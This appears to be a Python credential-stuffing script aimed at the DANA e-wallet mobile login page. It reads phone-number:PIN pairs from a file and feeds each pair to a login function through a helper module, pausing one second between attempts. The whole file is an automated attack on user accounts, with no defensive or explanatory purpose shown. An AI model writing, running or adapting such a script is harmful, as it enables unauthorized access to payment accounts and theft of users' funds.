from dana_bot import *
import sys, time

page = 'https://m.dana.id/d/ipg/inputphone?phoneNumber=&ipgForwardUrl=%2Fd%2Fportal%2Fcashier%2Fcheckout%3FbizNo%3D20221022111212800110166986670169575%26timestamp%3D1666407793180%26mid%3D216620000024248245596%26sign%3DFH5xmuO4CB%252FuAKaIDOj3pwcfy86XOMeCzdkqNOfU2lfi9QMR%252Bnw57cRgbwX8mzYOWyBMI2qqBjxBhHKz%252BISO75H3JQebMAEETM6lUv5STJgpYfEooVGAqydwgaN7MLTuw6wu1MPCwSV1y36R%252Br7h7Jy4v6IlllrCwSs%252FQ%252BQA1XObjLJvor8SM2Mgkti2bNqfW9A3Jja0dYUPXx20hOwd0TB0XQdblsAQlLTtigR1S89TU0mtnrCfFaZwn%252BbjVgL%252Ba%252F0uT1gtT%252FQw%252BLxbN1i7Jg3HC0eb1TSHrCrd08EIfGjzW42HtijrBzxEBte7uRE%252BgppZ8wl%252BQ6j96kmowSSxiw%253D%253D%26forceToH5%3Dfalse'

f = open(sys.argv[1], "r")

for i in f.read().split('\n'):
	x = i.split(":")
	no = x[0]
	pin = x[1]

	login(page, no, pin)
	time.sleep(1)